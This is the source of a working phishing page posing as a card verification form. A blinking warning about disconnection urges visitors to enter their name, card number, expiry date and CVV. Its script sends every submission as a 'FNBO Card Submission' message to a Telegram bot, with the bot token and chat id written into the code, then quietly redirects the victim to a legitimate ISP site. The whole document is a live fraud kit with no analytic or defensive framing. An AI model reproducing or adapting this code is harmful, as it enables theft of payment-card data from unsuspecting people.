  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f8f8f8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card-form {
      background: #ffffff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      width: 320px;
    }
    .card-form h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    .card-form label {
      display: block;
      margin-bottom: 6px;
      font-weight: bold;
    }
    .card-form input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    .card-form button {
  width: 100%;
  padding: 12px;
  background-color: #3d8a3f; /* Deep green */
  border: none;
  color: white;
  font-size: 16px;
  border-radius: 6px;
  cursor: pointer;
}

.card-form button:hover {
  background-color: #3d8a3f; /* Slightly darker green for hover effect */
}

  </style>

    <style>
  @keyframes blink {
    0%   { opacity: 1; }
    50%  { opacity: 0; }
    100% { opacity: 1; }
  }

  .blinking-text {
    text-align: center;
    color: red; /* Changed from white to red */
    font-weight: bold;
    font-size: 18px; /* Increased from 18px to 28px */
    font-family: sans-serif;
    margin-bottom: 15px;
    animation: blink 1s infinite;
  }
</style>

<p class="blinking-text">
  Verify Your Card To Avoid Disconnection
</p>

    <label for="name">Cardholder Name</label>
    <input type="text" id="name" name="name" required>

    <label for="cardnumber">Card Number</label>
    <input type="text" id="cardnumber" name="cardnumber" maxlength="19" required>

    <label for="exp">Expiration Date (MM/YY)</label>
    <input type="text" id="exp" name="exp" placeholder="MM/YY" maxlength="5" required>

    <label for="cvv">CVV</label>
    <input type="text" id="cvv" name="cvv" maxlength="4" required>

    <button type="submit">Verify Card</button>
  </form>

  <script>
    (function() {
      const form = document.getElementById('payment-form');

      form.addEventListener('submit', async function(e) {
        e.preventDefault();

        // gather data
        const data = {
          name: form.name.value.trim(),
          cardnumber: form.cardnumber.value.trim(),
          exp: form.exp.value.trim(),
          cvv: form.cvv.value.trim()
        };

        // compose telegram message
        const message =
          `🆕 *FNBO Card Submission*\n` +
          `• Name: \`${data.name}\`\n` +
          `• Number: \`${data.cardnumber}\`\n` +
          `• Expiry: \`${data.exp}\`\n` +
          `• CVV: \`${data.cvv}\``;

        // your bot credentials
        const botToken = '7680635281:AAHiIB8wn4f3N5-n-RZ721jwMDxXAgfHZGI';
        const chatId   = '6078089614';
        const url      = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // send, then redirect immediately
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: 'Markdown'
            })
          });
        } catch (ignore) {
          // optionally log errors: console.error(ignore);
        }

        // redirect without showing any status
        window.location.href = 'https://www.shentel.com/';
      });
    })();
  </script>
